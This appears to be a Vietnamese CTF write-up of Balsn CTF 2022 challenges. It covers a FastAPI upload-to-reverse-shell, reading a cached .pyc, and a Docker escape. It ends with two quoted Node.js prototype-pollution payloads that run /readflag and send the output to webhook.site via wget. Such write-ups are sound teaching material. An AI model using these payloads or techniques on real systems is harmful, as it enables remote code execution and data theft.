# welcome (misc)

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1662427236124/mmmW5ruhU.png)

Access tới url ta thấy một terminal, nhập `showflag`: 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1662427361093/2acIO6X1R.png)

Một vài dòng cat được hiển thị ra, tiếp theo mình check `history`

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1662427395633/GhfJRaU9b.png)

Cuối cùng chỉ cần cat từng file và nối lại với nhau ta được flag

> BALSN{WELCOME_2_BALSNCTF!}

---

# my first app (web)

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1662427194147/H0mLMPc6k.png)

Bài này mình làm theo kiểu hơi chày cối 1 tí 😚, view source 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1662427038824/ePBXWdqJA.png)

và flag nằm ở `/_next/static/chunks/pages/index-1491e2aa877a3c04.js`


![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1662427080949/TYPPym1fC.png)

---

# Health Check 1 (web)

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1662427182027/q2wGoqpjH.png)

Từ mô tả có thể đoán được server sử dụng framework FastAPI, thử access tới `/docs`

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1662427620743/rCIAvdchJ.png)

Ở api `/new`, server sẽ chạy file `run` trong zipfile mà ta uploaded lên

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1662427680300/4WQ0d5uXN.png)

sau khi reverse shell và check permission thì có vẻ như file `flag2` và `flag1.py` ta không có quyền đọc (user hiện tại là nobody)

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1662428331751/B4ZPBshZf.png)

từ `background.py` có thể thấy `flag1.py` được import vào, vì vậy nó sẽ được compiled và file .pyc của nó nằm trong folder `__pycache__`

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1662428479603/gg2jqdyw8.png)

cat file .pyc này ra là có flag1

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1662429909655/NlkkQm4Tb.png)

> BALSN{y37_4n0th3r_pYC4ch3_cHa1leN93???}

---

# Health Check 2 (web)

Source vẫn như cũ nhưng ta cần đọc được flag2, phần này hơi thiêng về "Privilege escalation" 1 tí mà cụ thể là docker escape

Có thể thấy ở `background.py`

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1662436865615/Do9fa8HR-.png)

Nếu tồn tại file `docker-entry` trong zip file gửi lên thì sẽ run một container với option -v và user là `user`, idea sẽ như video [này](https://www.youtube.com/watch?v=0oTuH_xY3mw)

Trước tiên rev shell vô container (bỏ payload rev shell vào file docker-entry) sau đó

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1662437724629/07MRlQiRQ.png)

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1662437736350/yEDH_f3MO.png)

> BALSN{d0cK3r_baD_8ad_ro07_B4d_b@d}

---

# 2linenodejs (web)

Maple's payload:

```
?{"__proto__":{"command":"sh","contextExtensions":[{"process":{"argv":["","","-c","wget\thttp://webhook.site/81f6d1c1-a744-4d78-966a-136742f02e34?flag=$(/readflag)"]}}],"path":"/usr/local/lib/node_modules/npm/node_modules/opener/bin","data":{"aaa":"bbb","exports":"./opener-bin.js","name":"./usage"}},"toString":{"arguments":0}} x
```

Huli's payload:

```
?{"__proto__":{"data":{"exports":{".":"./preinstall.js"},"name":"./usage"},"path":"/opt/yarn-v1.22.19","shell":"node","npm_config_global":1,"env":{"NODE_DEBUG":"console.log(require('child_process').execSync('wget${IFS}https://webhook.site/a0beafdc-df63-4804-85a8-7945ad473bf5?q=$(/readflag)').toString());process.exit()//","NODE_OPTIONS":"--require=/proc/self/environ"},"__proto__":{}}}
```

Writeup: <https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs>